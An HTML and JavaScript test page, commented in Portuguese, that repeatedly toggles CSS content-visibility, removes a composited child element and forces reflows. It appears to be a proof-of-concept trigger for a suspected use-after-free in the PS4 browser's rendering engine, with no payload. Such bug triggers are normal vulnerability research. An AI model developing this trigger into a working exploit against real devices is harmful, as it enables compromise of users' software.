<!doctype html>
<meta charset="utf-8">
<title>PS4 RenderLayer content-visibility UAF candidate</title>

<button id="run">RUN (10x)</button>
<button id="stop">STOP</button>
<pre id="log"></pre>

<div id="container">
  <div id="child"></div>
</div>

<style>
  #container {
    width: 100vw;
    height: 100vh;
    overflow: hidden;
    /* vamos setar content-visibility via JS para poder alternar */
  }
  #child {
    width: 120px;
    height: 120px;
    background: #09f;
    position: absolute;
    left: 40px;
    top: 40px;
    transform: translateZ(0); /* força layer/compositing em muitos engines */
  }
</style>

<script>
const logEl = document.getElementById('log');
function log(s){ logEl.textContent += s + "\n"; logEl.scrollTop = logEl.scrollHeight; }

const container = document.getElementById('container');

let stop = false;

function setCV(value){
  // tenta ambas as formas comuns
  container.style.contentVisibility = value;
  container.style.webkitContentVisibility = value;
}

function forceReflow(){
  // leituras forçam style/layout flush
  void container.offsetHeight;
  void document.body.offsetHeight;
}

function makeChild(){
  const old = document.getElementById('child');
  if (old) old.remove();

  const d = document.createElement('div');
  d.id = 'child';
  d.style.width = '120px';
  d.style.height = '120px';
  d.style.background = '#09f';
  d.style.position = 'absolute';
  d.style.left = '40px';
  d.style.top = '40px';
  d.style.transform = 'translateZ(0)';
  container.appendChild(d);
  return d;
}

async function tick(){
  return new Promise(r => requestAnimationFrame(() => r()));
}

async function oneIteration(i){
  log(`--- iter ${i} ---`);

  const child = makeChild();
  forceReflow();

  // 1) altera content-visibility para esconder / mudar flags
  setCV('hidden');
  await tick();
  forceReflow();

  // 2) remove o filho
  child.remove();
  forceReflow();

  // 3) restaura content-visibility para disparar recompute
  setCV('auto');
  await tick();
  forceReflow();

  // 4) “estressor leve”: toggle de overflow/transform para incentivar recomposição
  container.style.overflow = (i % 2) ? 'hidden' : 'clip';
  await tick();
  forceReflow();

  log(`container children: ${container.childElementCount}`);
}

document.getElementById('run').onclick = async () => {
  stop = false;
  log("UA: " + navigator.userAgent);
  log("Starting...");

  // Aquecimento (muitas engines ficam mais “estáveis” após 1-2 flushes)
  setCV('auto');
  forceReflow();

  const N = 10; // mantenha pequeno para não travar o console
  for (let i = 1; i <= N; i++){
    if (stop) { log("STOPPED"); break; }
    try {
      await oneIteration(i);
    } catch(e) {
      log("JS exception: " + (e && e.message ? e.message : e));
      break;
    }
  }
  log("Done.");
};

document.getElementById('stop').onclick = () => { stop = true; };
</script>
</body>
</html>

